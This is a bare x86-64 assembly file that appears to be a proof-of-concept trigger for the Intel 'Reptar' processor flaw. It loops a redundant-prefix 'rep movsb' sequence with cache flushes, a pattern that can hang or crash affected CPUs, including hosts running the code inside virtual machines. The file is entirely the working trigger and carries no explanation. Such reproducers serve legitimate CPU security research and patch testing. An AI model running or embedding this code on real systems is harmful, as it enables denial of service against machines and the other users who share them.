BITS 64

global _start

section .text
    _start:
        xor rcx, rcx
        lea rsi, [rsp+1]
        mov rdi, rsi
        .many_reptars:
        %rep 100000
            clflush [rdi-1]
            clflush [rsi+63]
            dec rsi
            dec rdi
            inc rcx
            rep
            db 0x44; rex.r
            movsb
            pause
            pause
        %endrep
        nop
        times 1024 int3
